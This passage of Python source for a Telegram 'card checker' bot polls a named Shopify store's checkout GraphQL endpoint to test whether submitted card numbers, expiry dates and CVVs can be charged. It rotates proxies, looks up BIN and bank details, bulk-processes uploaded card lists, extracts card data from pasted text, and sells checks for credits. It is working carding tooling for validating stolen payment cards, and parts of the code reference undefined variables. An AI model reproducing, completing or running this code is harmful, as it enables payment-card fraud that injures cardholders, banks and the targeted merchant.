__typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment FinalizedRemoteCheckoutsResult on FinalizedRemoteCheckout{shopId result{...on ProcessedRemoteReceipt{orderIdentity{buyerIdentifier id __typename}orderStatusPageUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}payment{paymentLines{amount{amount currencyCode __typename}__typename}__typename}delivery{deliveryLines{deliveryStrategy{handle title __typename}lineAmount{amount currencyCode __typename}__typename}__typename}__typename}__typename}...on FailedRemoteReceipt{recoveryUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}',
        'variables': {
            'receiptId': rid,
            'sessionToken': x,
        },
        'operationName': 'PollForReceipt',
    }
    
    
    status = "Declined!❌"
    resp_msg = "Processing Failed!"
    
    max_retries = 5
    order_details = {}
    
    for attempt in range(max_retries):
        random_delay(0.3, 0.6)  # Minimal delay between polls
        final_response = session.post('https://violettefieldthreads.com/checkouts/unstable/graphql', 
                                      params=params, 
                                      headers=headers, 
                                      json=json_data, 
                                      proxies=proxy if proxy else None)
        final_text = final_response.text
        #------------×Polling_receipt×-------------#
        
        
        #-----------×Response_For_Ui_to_Send×-------------#
        print(f"\n=== Poll Attempt {attempt + 1} DEBUG ===")
        print(f"Status Code: {final_response.status_code}")
        print(f"Response Length: {len(final_text)} chars")
        print(f"Response Snippet: {final_text[:300]}...")
        
        if "thank" in final_text.lower() or '"__typename":"ProcessedReceipt"' in final_text:
            status = "Charged🔥"
            resp_msg = "ORDER_PLACED"
            
            print(f"\n🔥 ORDER SUCCESSFUL! 🔥")
            print(f"Full Response: {final_text[:1000]}...")
            
            try:
                response_json = json.loads(final_text)
                receipt_data = response_json.get('data', {}).get('receipt', {})
                
                order_id = receipt_data.get('id', 'N/A')
                redirect_url = receipt_data.get('redirectUrl', 'N/A')
                confirmation_url = receipt_data.get('confirmationPage', {}).get('url', 'N/A')
                order_status_url = receipt_data.get('orderStatusPageUrl', 'N/A')
                
                order_details = {
                    'order_id': order_id,
                    'redirect_url': redirect_url,
                    'confirmation_url': confirmation_url,
                    'order_status_url': order_status_url
                }
                
                print(f"Order ID: {order_id}")
                print(f"Redirect URL: {redirect_url}")
                print(f"Confirmation URL: {confirmation_url}")
                print(f"Order Status URL: {order_status_url}")
                
            except Exception as e:
                print(f"Error parsing order details: {e}")
            break
        elif "actionrequiredreceipt" in final_text.lower():
            status = "Declined!❌"
            resp_msg = "3D_SECURE_REQUIRED"
            print(f"\n❌ 3D Secure Required")
            print(f"Response: {final_text[:500]}...")
            break
        elif "processingreceipt" in final_text.lower() or "waitingreceipt" in final_text.lower():
            print("⏳ Still processing...")
            time.sleep(0.5)  #------×Small_wait×-------#
            continue
        else:
            #-----------×Extracting_error_code×----------#
            error_code = find_between(final_text, '"code":"', '"').lower()
            print(f"\n❌ Payment Failed")
            print(f"Error Code: {error_code}")
            print(f"Response: {final_text[:500]}...")
            
            if "fraud" in error_code or "buyerproposal" in final_text.lower():
                resp_msg = "FRAUD_SUSPECTED"
            elif "insufficient_funds" in error_code:
                resp_msg = "INSUFFICIENT_FUNDS"
            else:
                resp_msg = "CARD_DECLINED"
            break
            
    elapsed_time = time.time() - start_time
    print(f"\n=== CHECK COMPLETED ===")
    print(f"Time: {elapsed_time:.2f}s")
    print(f"Status: {resp_msg}")
    print(f"========================\n")
    #-----------×Response_For_Ui_to_Send×-------------#
    
    
    #------------×Bin_info×------------#
    bin_number = n[:6]
    bin_info = get_bin_info(bin_number)
    
    result = {
        'full_card': full_card, 
        'status': status, 
        'resp_msg': resp_msg,
        'username': username, 
        'dev': '𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽',
        'dev_emoji': '☃',
        'order_details': order_details,
        'elapsed_time': f"{elapsed_time:.2f}s",
        'bin': bin_number,
        'bin_info': bin_info
    }
    return result
    #------------×Bin_info×------------#

    
#--------------COMMAND×HANDLERZ-BOT---------------#


#-----------×Start_command_Boring_bc×-----------#
# Converted handlers for python-telegram-bot (async)
import asyncio
import time
import logging
import re
import os
import requests  # kept (your test_proxy used requests) - blocking calls run in thread

from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ---------NOTEE----------#
# This code assumes these globals and helper functions are already defined elsewhere
# in your file exactly as before (do not rename):
# CHECKED, TOTAL, CHARGED, DECLINED, ERROR, DEAD, STOP_CHECKING, LOCK,
# PROXIES, proxy_list, ANIMATION_FRAMES, ADMIN_CHAT_ID, TOKEN, logger, etc.
# Also assumes helper functions: add_user, get_user_credits, deduct_credit, sh,
# random_delay, get_random_proxy, test_proxy (we wrap blocking calls), load_data,
# redeem_gift_code, generate_gift_code, add_credits, get_user_credits, etc.
# ---------------------------


logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)


# ---------------- START / HELP ----------------
import asyncio
import time
import logging
import re
import os
import requests

from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# --- Assumes these globals and helper functions exist exactly as you defined:
# CHECKED, TOTAL, CHARGED, DECLINED, ERROR, DEAD, STOP_CHECKING, LOCK,
# PROXIES, proxy_list, ANIMATION_FRAMES, ADMIN_CHAT_ID, TOKEN, logger,
# add_user, get_user_credits, deduct_credit, sh, random_delay, get_random_proxy,
# test_proxy (or test_proxy_blocking), load_data, redeem_gift_code,
# generate_gift_code, add_credits, etc.


def test_proxy_blocking(proxy_dict):
    try:
        test_url = "https://violettefieldthreads.com"
        start_time = time.time()
        response = requests.get(test_url, proxies=proxy_dict, timeout=10)
        elapsed_ms = int((time.time() - start_time) * 1000)
        if response.status_code == 200:
            return True, elapsed_ms
        else:
            return False, 0
    except Exception:
        return False, 0
        
        
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)
test_proxy = test_proxy_blocking
# ---------- Helper to get message, user info ----------
def get_msg_user_info(update: Update):
    """
    Returns tuple: (msg, user, user_id, username)
    """
    msg = update.effective_message
    user = update.effective_user
    user_id = getattr(user, "id", None) if user else None
    username = getattr(user, "username", None) if user else None
    if not username:
        username = "USER"
    return msg, user, user_id, username
    
    
    

# ---------------- START / HELP ----------------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)
    #----------inline_keyboard----------#
    keyboard = [
        [InlineKeyboardButton("SHOPIFY", callback_data="opt1")],
        [InlineKeyboardButton("FREE-GATES 💳", callback_data="opt2")],
    ]

    # add user
    try:
        add_user(user_id, username)
    except Exception as e:
        logger.warning(f"add_user failed in start_command: {e}")

    credits = 0
    try:
        credits = get_user_credits(user_id)
    except Exception as e:
        logger.warning(f"get_user_credits failed in start_command: {e}")

    start_text = f"""
<b>𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽 ᚕ 𝘾𝙃𝙀𝘾𝙆𝙀𝙍</b>

⭝ <b>𝙔𝙊𝙐𝙍 𝘾𝙍𝙀𝘿𝙄𝙏𝙎</b> ⭆ {credits}

⬒ 𝙎𝙀𝙉𝘿 𝘾𝘼𝙍𝘿𝙎 𝘿𝙄𝙍𝙀𝘾𝙏𝙇𝙔 𝙄𝙉 𝘾𝙃𝘼𝙏
⬓ 𝙐𝙋𝙇𝙊𝘼𝘿 .𝙩𝙭𝙩 𝙁𝙄𝙇𝙀 𝙄𝙉 𝘾𝙃𝘼𝙏

⨴⨵ <b>𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎 𝙏𝙊 𝙐𝙎𝙀 ꉌ</b>
━━━━━━━━━━━━━

<blockquote>/𝙨𝙝 ⭇ 𝙘𝙝𝙚𝙘𝙠𝙨 𝙨𝙞𝙣𝙜𝙡𝙚 𝙘𝙖𝙧𝙙 𝙛𝙤𝙧 𝙤𝙣𝙚 𝙘𝙧𝙚𝙙𝙞𝙩
/𝙢𝙨𝙝 ⭇ 𝙘𝙝𝙚𝙘𝙠𝙨 𝙢𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 𝙤𝙣𝙚 𝙘𝙧𝙚𝙙𝙞𝙩 𝙚𝙖𝙘𝙝
/𝙘𝙧𝙚𝙙𝙞𝙩𝙨 ⭇ 𝙫𝙞𝙚𝙬 𝙮𝙤𝙪𝙧 𝙘𝙧𝙚𝙙𝙞𝙩𝙨
/𝙧𝙚𝙙𝙚𝙚𝙢 ⭇ 𝙧𝙚𝙙𝙚𝙚𝙢 𝙘𝙧𝙚𝙙𝙞𝙩𝙨
/𝙖𝙙𝙙𝙥𝙧𝙤𝙭𝙮 ⭇ 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮
/𝙧𝙚𝙢𝙤𝙫𝙚𝙥𝙧𝙤𝙭𝙞𝙚𝙨 ⭇ 𝙧𝙚𝙢𝙤𝙫𝙚 𝙖𝙡𝙡 𝙥𝙧𝙤𝙭𝙞𝙚𝙨l
/𝙢𝙮𝙥𝙧𝙤𝙭𝙞𝙚𝙨 ⭇ 𝙫𝙞𝙚𝙬 𝙘𝙪𝙧𝙧𝙚𝙣𝙩 𝙥𝙧𝙤𝙭𝙞𝙚𝙨
/𝙨𝙤𝙧𝙩 ⭇ 𝙨𝙤𝙧𝙩 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 .𝙩𝙭𝙩 𝙛𝙞𝙡𝙚</blockquote>

━━━━━━━━━━━━━

<b>𝙂𝘼𝙏𝙀 ⤏ 𝙎𝙃𝙊𝙋𝙄𝙁𝙔 5$</b>

ꏥ <b>𝘿𝙀𝙑</b> ⭌ @technopile ⸙
"""
    
    await context.bot.send_animation(
        chat_id=user_id,
        animation="https://media.giphy.com/media/ySvhFxq6Z4LrbqaikJ/giphy.gif",
        caption=start_text,
        parse_mode="HTML",reply_markup=InlineKeyboardMarkup(keyboard))

# ---------------- /sort ----------------
async def sort_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, _, _ = get_msg_user_info(update)
    text = None

    if context.args:
        text = " ".join(context.args)
    else:
        full = msg.text or ""
        parts = full.split(maxsplit=1)
        if len(parts) >= 2:
            text = parts[1]

    if not text:
        await msg.reply_text("𝙎𝙀𝙉𝘿 𝙈𝙄𝙓𝙓𝙀𝘿 𝙏𝙀𝙓𝙏 𝙏𝙊 𝙀𝙓𝙏𝙍𝘼𝘾𝙏 𝘾𝘼𝙍𝘿𝙎 𝙁𝙍𝙊𝙈 ↂ \n 𝙐𝙎𝙀 /sort [text containing cards]")
        return

    try:
        pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
        found_cards = re.findall(pattern, text)

        if not found_cards:
            await msg.reply_text("𝙉𝙊 𝙑𝘼𝙇𝙄𝘿 𝘾𝘼𝙍𝘿𝙎𝙁𝙊𝙐𝙉𝘿 ፠")
            return

        unique_formatted_cards = set()
        for card_tuple in found_cards:
            card_num, month, year_raw, cvv = card_tuple

            if len(year_raw) == 4 and year_raw.startswith("20"):
                year = year_raw[2:]
            else:
                year = year_raw.zfill(2)[-2:]

            month_formatted = month.zfill(2)
            formatted_card = f"{card_num}|{month_formatted}|{year}|{cvv}"
            unique_formatted_cards.add(formatted_card)

        output_text = "\n".join(sorted(unique_formatted_cards))

        if output_text:
            await msg.reply_text(f"```\n{output_text}\n```", parse_mode='Markdown')
        else:
            await msg.reply_text("No valid cards were found after formatting.")

    except Exception as e:
        logger.exception(f"An error occurred in /sort command: {e}")
        await msg.reply_text("An error occurred while trying to sort the cards.")

# ---------------- /sh single check ----------------
# ---------------- /sh single check ----------------
# ---------------- /sh single check ----------------
async def sh_command(update: Update = None,
                     context: ContextTypes.DEFAULT_TYPE = None,
                     card_details: str = None,
                     username: str = None,
                     user_id: int = None,
                     msg=None):
    # This function supports both Telegram command invocation and internal loop calls.
    # If update is provided, treat as Telegram invocation; else treat as internal.

    # Detect invocation type
    if update:
        msg, user, user_id, username = get_msg_user_info(update)
        args = context.args if context and getattr(context, "args", None) else []
        if args:
            card_details = " ".join(args)
    else:
        # internal call should pass card_details, username, user_id, msg at least
        if not all([card_details, username, user_id]):
            print("Missing required params for internal sh_command call.")
            return
    
    if msg:
        await msg.reply_text(f"𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 ⭟ {card_details}")
    else:
        print(f"𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 ⭌ {card_details} 𝙁𝙊𝙍 𝙐𝙎𝙀𝙍 ⭌ ࿇ {username}")

    # add user
    try:
        add_user(user_id, username)
    except Exception as e:
        logger.warning(f"add_user failed in sh_command: {e}")

    # credits check
    credits = 0
    try:
        credits = get_user_credits(user_id)
    except Exception as e:
        logger.warning(f"get_user_credits failed in sh_command: {e}")

    if credits < 1:
        if msg:
            await msg.reply_text("❌ 𝙄𝙉𝙎𝙐𝙁𝙁. 𝙘𝙧𝙚𝙙𝙞𝙩𝙨\n 𝙔𝙤𝙪 𝙣𝙚𝙚𝙙 𝙤𝙣𝙚 𝙘𝙧𝙚𝙙𝙞𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠\n𝙐𝙎𝙀 /redeem 𝙩𝙤 𝙧𝙚𝙙𝙚𝙚𝙢 𝙘𝙧𝙚𝙙𝙞𝙩𝙨.")
        else:
            print("❌ Insufficient credits!")
        return

    if not card_details:
        if msg and hasattr(msg, "text"):
            full = msg.text.strip()
            parts = full.split(maxsplit=1)
            if len(parts) >= 2:
                card_details = parts[1]
        else:
            print("𝙁𝙤𝙧𝙢𝙖𝙩𝙩 𝙞𝙣𝙫𝙖𝙡𝙞𝙙")
        if not card_details:
            if msg:
                await msg.reply_text("𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙁𝙤𝙧𝙢𝙖𝙩𝙩 \n 𝙐𝙎𝙀 /sh cardnumber|mm|yy|cvc")
            return

    # deduct credit
    try:
        deduct_credit(user_id)
    except Exception as e:
        logger.warning(f"deduct_credit failed for user {user_id}: {e}")

    # send waiting message
    sent_msg = None
    if msg:
        sent_msg = await msg.reply_text("<blockquote>𝘾𝙤𝙤𝙠𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙘𝙖𝙧𝙙........</blockquote>",parse_mode="HTML")

    # call the main checker function (sh_check) – handle async/sync
    try:
        if asyncio.iscoroutinefunction(sh_check):
            result = await sh_check(card_details, username)
        else:
            result = await asyncio.to_thread(sh_check, card_details, username)
    except Exception as e:
        logger.exception(f"sh_check() raised exception for card {card_details}: {e}")
        if sent_msg:
            await sent_msg.edit_text(f"Error: {e} ❌")
        else:
            print(f"Error: {e}")
        return

    # build response text
    if isinstance(result, str):
        response_text = f"Error: {result} ❌"
    else:
        if "Charged" in result.get('status', ''):
            status_emoji = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 💎"
            response_format = f"⤿{result.get('resp_msg','')}⤾"
        else:
            status_emoji = result.get('status', '')
            response_format = result.get('resp_msg', '')

        bin_info = result.get('bin_info', {})
        remaining_credits = get_user_credits(user_id)

        response_text = f"""𝙎𝙃𝙊𝙋𝙄𝙁𝙔 𝘾𝙃𝘼𝙍𝙂𝙀 ༐ 𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽 (/sh) 
━━━━━━━━━━━━━
♞ 𝘾𝙖𝙧𝙙 ⤏ {result.get('full_card')}
♜ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ⤏ 𝙨𝙝𝙤𝙥𝙞𝙛𝙮 5$
⁠✧ 𝙎𝙩𝙖𝙩𝙪𝙨 ⤏ {status_emoji}
♛ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ⤏ {response_format}
━━━━━━━━━━━━━
<blockquote> 𝘽𝙞𝙣 ⭆ {result.get('bin')}
⚉ 𝙄𝙣𝙛𝙤 ⭆ {bin_info.get('scheme','')} - {bin_info.get('type','')} - PERSONAL
⛃ 𝘽𝙖𝙣𝙠 ⭆ {bin_info.get('bank','')}
❆ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ⭆ {bin_info.get('country','')} - {bin_info.get('emoji','')} </blockquote>
━━━━━━━━━━━━━
 𝙘𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 ➪ @{username} (PREMIUM) 
 𝘿𝙚𝙫 ➬ {result.get('dev','')} - {result.get('dev_emoji','')}
━━━━━━━━━━━━━
▶𝙏𝙞𝙢𝙚 [{result.get('elapsed_time','')}] | Credits: ({remaining_credits}) 𝙎𝙩𝙖𝙩𝙪𝙨 ☛ (Live)"""

    # send or edit reply
    try:
        if sent_msg:
            await sent_msg.edit_text(response_text, parse_mode='HTML')
        elif msg:
            await msg.reply_text(response_text, parse_mode='HTML')
        else:
            print(response_text)
    except Exception as e:
        logger.warning(f"Could not send Telegram message: {e}")
        if msg:
            await msg.reply_text(response_text, parse_mode='HTML')
        else:
            print(response_text)

# ---------------- Mass-check helpers (process_card_list) ----------------
async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, username: str):
    msg, user, user_id, username = get_msg_user_info(update)

    if not username:
        username = "USER"

    if not cards:
        await msg.reply_text("No valid cards found to check.")
        return

    total_cards = len(cards)
    if total_cards > 1000:
        await msg.reply_text(f"𝙏𝙊𝙊 𝙈𝘼𝙉𝙔 𝘾𝘼𝙍𝘿𝙎┥┝ 1000 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙉𝙊𝙏 ┮ {total_cards}.")
        return

    credits = get_user_credits(user_id)
    if credits < total_cards:
        await msg.reply_text(f"❌ Insufficient credits! You have {credits} credits but need {total_cards} credits to check all cards.")
        return

    bulk_start_time = time.time()

    proxy_info = ""
    if proxy_list:
        proxy = get_random_proxy()
        if proxy:
            proxy_host = proxy['http'].split('@')[-1]
            is_working, proxy_ms = await asyncio.to_thread(test_proxy, proxy)
            if is_working:
                proxy_info = f"𝙋𝙍𝙊𝙓𝙔 ⛖  `{proxy_host}` ({proxy_ms}ms)"
            else:
                proxy_info = f"⚠️ Proxy: `{proxy_host}` (Not responding)"

    start_msg = f"𝘾𝙤𝙤𝙠𝙞𝙣𝙜 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 ⛟ {total_cards} 𝙘𝙖𝙧𝙙𝙨 𝙁𝙤𝙪𝙣𝙙 "
    if proxy_info:
        start_msg += f"\n{proxy_info}"

    await msg.reply_text(start_msg, parse_mode='Markdown')

    global CHECKED, TOTAL, CHARGED, ERROR, DECLINED, STOP_CHECKING
    TOTAL = total_cards
    CHECKED = CHARGED = DECLINED = DS = ERROR = 0  # Reset globals if needed
    STOP_CHECKING = False  # Ensure reset at start

    progress_message = await msg.reply_text("☸")

    successful = 0
    declined = 0
    errors = 0
    ds = 0

    for i, card_details in enumerate(cards):
        if STOP_CHECKING == True:
        	break  # Stop if /stop was called

        try:
            deduct_credit(user_id)
        except Exception as e:
            logger.warning(f"deduct_credit failed for {user_id}: {e}")

        if i > 0:
            if asyncio.iscoroutinefunction(random_delay):
                await random_delay(1, 2)
            else:
                await asyncio.to_thread(random_delay, 1, 2)

        result_text = ""
        try:
            # call sh_check – handle async/sync
            if asyncio.iscoroutinefunction(sh_check):
                result = await sh_check(card_details, username)
            else:
                result = await asyncio.to_thread(sh_check, card_details, username)

            if isinstance(result, str):
                card_to_display = card_details
                response_msg = f"Error: {result}"
                errors += 1
            else:
                card_to_display = result.get('full_card', card_details)
                response_msg = result.get('resp_msg', '')
                if "actionrequiredreceipt" in final_text.lower():
                    DS += 1
                    CHECKED += 1

                if "CHARGED" in result.get('status', '') or "ORDER_PLACED" in response_msg:
                    CHARGED += 1
                    successful += 1
                    CHECKED += 1
                elif "DECLINED" in result.get('status', ''):
                    DECLINED += 1
                    declined += 1
                    CHECKED += 1
                else:
                    DECLINED += 1
                    declined += 1
                    CHECKED += 1

            safe_card = card_to_display.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
            result_text = f"𝘾𝙖𝙧𝙙 ☛ `{safe_card}`\n𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ☛ *{response_msg}*\n\n☣ 𝘽𝙞𝙣 ☛ {result.get('bin')}\n☢ 𝙄𝙣𝙛𝙤 ☛ {bin_info.get('scheme','')} - {bin_info.get('type','')} - PERSONAL\n☱ 𝘽𝙖𝙣𝙠 ☛ {bin_info.get('bank','')}\n[ϟ] Country: {bin_info.get('country','')} - [{bin_info.get('emoji','')}]\n\n━━━━━━━━━━━━━\n\n⛏ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 ☛ @{username} [ 💎 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 ]\n☕ 𝘿𝙚𝙫 ∝ {result.get('dev','')} - {result.get('dev_emoji','')}"

        except Exception as e:
            logger.exception(f"Error processing card {card_details}: {e}")
            safe_card = card_details.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
            result_text = f"Card: `{safe_card}`\nResponse: *Processing Error ❗️*"
            ERROR += 1
            errors += 1

        try:
            await context.bot.send_message(chat_id=msg.chat.id, text=result_text, parse_mode='Markdown')
        except Exception as e:
            logger.warning(f"Failed to send per-card message: {e}")

        if (i % 5 == 0) or (i == total_cards - 1):
            elapsed = time.time() - bulk_start_time
            avg_time = (elapsed / (i+1)) if (i+1) else 0.0
            try:
                await context.bot.edit_message_text(
                    chat_id=progress_message.chat.id,
                    message_id=progress_message.message_id,
                    text=(
                        f"Running... {i+1}/{total_cards}\n"
                        f"Charged: {CHARGED} | Declined: {DECLINED} | Errors: {ERROR}\n"
                        f"Elapsed: {elapsed:.2f}s | Avg: {avg_time:.2f}s"
                    )
                )
            except Exception as e:
                logger.warning(f"Failed to edit progress message: {e}")
                await asyncio.sleep(0.5)

    total_time = time.time() - bulk_start_time
    avg_time = total_time / total_cards if total_cards else 0.0
    remaining_credits = get_user_credits(user_id)

    status_title = "✅ **Check Completed!**" if not STOP_CHECKING else "🛑 **Check Stopped!**"
    completion_msg = f"""{status_title}
━━━━━━━━━━━━━
 𝙎𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨 ⭚\n
• 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 ⭆ {CHECKED}/{total_cards}\n
• 𝙘𝙝𝙖𝙧𝙜𝙚𝙙 ⭆ {successful} 🔥\n
• 𝙙𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ⭆ {declined} ❌\n
• 𝙚𝙧𝙧𝙤𝙧𝙨 ⭆ {errors} ⚠️\n

<blockquote> 𝙏𝙞𝙢𝙞𝙣𝙜 ⭚\n
• 𝙏𝙤𝙩𝙖𝙡 𝙏𝙞𝙢𝙚 ⭆ {total_time:.2f}s\n
• 𝘼𝙫𝙜 𝙏𝙞𝙢𝙚 ⭆ {avg_time:.2f}s\n
• 𝙎𝙥𝙚𝙚𝙙 ⭆ { (CHECKED/total_time*60) if total_time>0 else 0:.1f} cards/min\n </blockquote>

 𝘾𝙧𝙚𝙙𝙞𝙩𝙨⭚\n
• 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 ⭆ {remaining_credits}
"""

    if proxy_info:
        completion_msg += f"\n{proxy_info}"

    completion_msg += "\n━━━━━━━━━━━━━\n🖥 𝘿𝙚𝙫 ⭞ 𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽"

    await context.bot.send_message(chat_id=msg.chat.id, text=completion_msg, parse_mode='HTML')

    STOP_CHECKING = False  # Reset after completion/stop

# ---------------- /stop command for bulk checks ----------------
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global STOP_CHECKING
    STOP_CHECKING = True
    await update.effective_message.reply_text("𝙘𝙝𝙚𝙘𝙠 𝙬𝙞𝙡𝙡 𝙨𝙩𝙤𝙥 𝙖𝙛𝙩𝙚𝙧 𝙩𝙝𝙞𝙨 𝙘𝙖𝙧𝙙.......")
    
# ---------------- Progress updater ----------------
# ---------------- Document upload (txt) ----------------
async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, _, _ = get_msg_user_info(update)
    doc = msg.document
    if not doc:
        await msg.reply_text("𝙉𝙊 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙁𝙤𝙪𝙣𝙙")
        return

    if not doc.file_name.lower().endswith('.txt'):
        await msg.reply_text("𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙞𝙡𝙚 𝙩𝙮𝙥𝙚!! 𝙪𝙥𝙡𝙤𝙖𝙙 .𝙩𝙭𝙩 𝙛𝙞𝙡𝙚")
        return

    try:
        file = await context.bot.get_file(doc.file_id)
        data = await file.download_as_bytearray()
        file_content = data.decode('utf-8', errors='ignore')
        cards = [line.strip() for line in file_content.splitlines() if line.strip()]
        username = msg.from_user.username or "USER"

        # Pass file_name to process_card_list for progress
        asyncio.create_task(process_card_list(update, context, cards, username, file_name=doc.file_name))
    except Exception as e:
        logger.exception(f"Error handling document: {e}")
        await msg.reply_text("An error occurred while processing the file.")

# ---------------- Progress updater ----------------
async def update_progress_message(bot, chat_id, message_id, start_time, file_name):
    global CHECKED, TOTAL, CHARGED, DECLINED, ERROR, STOP_CHECKING, ANIMATION_FRAMES, LOCK, PROXIES
    while not STOP_CHECKING:
        await asyncio.sleep(3)
        with LOCK:
            checked = CHECKED
            total = TOTAL
            charged = CHARGED
            dead = DECLINED
            error = ERROR
            ds = DS
        if total == 0:
            break
        percent = (checked / total * 100) if total else 0.0
        bar_len = 20
        filled = int(bar_len * (checked / total)) if total else 0
        bar = "█" * filled + "░" * (bar_len - filled)
        frame = ANIMATION_FRAMES[int(time.time() * 2) % len(ANIMATION_FRAMES)] if ANIMATION_FRAMES else ''
        elapsed = time.time() - start_time
        cpm = (checked / elapsed * 60) if elapsed > 0 else 0.0
        avg_time = (elapsed / checked) if checked else 0.0
        # Use MarkdownV2 and escape special characters
        from telegram.helpers import escape_markdown  # Correct import for v20+
        text = escape_markdown(
            f"𝘼𝙐𝙏𝙊⤚𝙨𝙝𝙤𝙥𝙞𝙛𝙮\n"
            f"𝙎𝙏𝘼𝙏𝙐𝙎 ⤏ 𝙍𝙪𝙣𝙣𝙞𝙣𝙜 {frame}\n\n"
            "━━━━━━━━━𝙎𝙏𝘼𝙏𝙎━━━━━━━━━\n"
            f"𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ⭆ {checked}/{total} [{bar}] {percent:.1f}%\n\n"
            f"𝘾𝙝𝙖𝙧𝙜𝙚𝙙 ⭆ {charged}\n\n"
            f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ⭆ {error}\n\n"
            f"3𝘿𝙎 ⭆ {ds}\n\n"
            f"𝙀𝙧𝙧𝙤𝙧 ⭆ {dead}\n"
